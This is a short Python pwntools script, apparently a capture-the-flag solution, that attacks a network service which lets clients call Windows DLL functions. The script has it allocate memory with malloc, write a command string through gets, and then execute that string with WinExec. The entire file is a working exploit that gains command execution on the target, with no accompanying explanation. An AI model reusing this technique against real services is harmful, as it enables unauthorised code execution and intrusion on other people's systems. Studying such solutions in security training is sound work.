#!/usr/bin/env python3
from pwn import *

split = lambda v, sz: [v[i : i + sz] for i in range(0, len(v), sz)]
uu64 = lambda x: u64(x.ljust(8, b"\0")[:8])

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

if args.REMOTE:
    print = lambda *a, **kw: None


context.newline = b"\r\n"

io = remote(HOST, PORT)
PROMPT = b"?\r\n"


def send(s, endl=True, recv=True):
    if type(s) != bytes:
        if type(s) != str:
            s = f"{s}\n"
        s = s.encode()
    if endl and s[-1] != ord("\n"):
        s += b"\n"
    if PROMPT and recv:
        io.recvuntil(PROMPT)
    io.send(s)


send("msvcrt.dll")
send("malloc")
send("100")
io.recvuntil(b"Result: ")
malloc_ret = int(io.recvline().strip(), 16)

send("msvcrt.dll")
send("gets")
send(malloc_ret)

io.sendline(b".\\submitter")
send("kernel32.dll")
send("WinExec")
send(malloc_ret)

print(io.recvall(1))
